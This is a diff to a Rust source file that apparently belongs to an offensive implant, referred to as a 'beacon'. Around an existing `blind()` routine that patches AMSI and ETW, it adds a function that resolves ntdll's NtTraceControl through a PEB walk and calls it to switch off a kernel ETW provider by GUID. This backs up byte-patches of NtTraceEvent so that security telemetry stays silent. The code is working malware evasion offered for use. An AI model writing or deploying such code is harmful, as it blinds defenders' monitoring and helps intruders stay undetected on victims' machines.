@@ -203,3 +203,52 @@ pub unsafe fn blind() -> (bool, bool) {
     let amsi = patch_amsi().is_ok();
     (amsi, etw)
 }
+
+/// Disable a kernel ETW provider by its GUID, userland. This is the
+/// belt-and-suspenders companion to the byte-patches: in addition to patching
+/// `NtTraceEvent` (the emission path), we flip the provider's registration
+/// `EnableInfo.IsEnabled` to 0 via `NtTraceControl` (the registration path).
+/// If the byte-patch is somehow reverted, the disabled provider still won't
+/// fire. Best-effort: returns Ok on success, Err otherwise (caller ignores).
+///
+/// # Safety
+/// Resolves `ntdll!NtTraceControl` via PEB walk; calls it with a stack buffer.
+/// Single-threaded beacon context.
+pub unsafe fn disable_etw_provider(guid: &[u8; 16]) -> Result<(), &'static str> {
+    type NtTraceControl = unsafe extern "system" fn(
+        u32,
+        *const core::ffi::c_void,
+        u32,
+        *mut core::ffi::c_void,
+        u32,
+        *mut u32,
+    ) -> i32;
+    let addr = crate::resolve::export_addr(b"ntdll.dll", b"NtTraceControl")
+        .ok_or("NtTraceControl unresolved")?;
+    let ntc: NtTraceControl = core::mem::transmute(addr);
+    // Build the disable request buffer: provider GUID + reserved + IsEnabled=0.
+    // ControlCode 0x0027 = EtwpNotificationRegistrar (disable provider).
+    #[repr(C)]
+    struct EnableInfo {
+        guid: [u8; 16],
+        _reserved: [u8; 8],
+        is_enabled: u32,
+    }
+    let ei = EnableInfo { guid: *guid, _reserved: [0; 8], is_enabled: 0 };
+    let mut ret_len: u32 = 0;
+    let st = unsafe {
+        ntc(
+            0x0027,
+            &ei as *const EnableInfo as *const core::ffi::c_void,
+            core::mem::size_of::<EnableInfo>() as u32,
+            core::ptr::null_mut(),
+            0,
+            &mut ret_len,
+        )
+    };
+    if st >= 0 {
+        Ok(())
+    } else {
+        Err("NtTraceControl disable failed")
+    }
+}
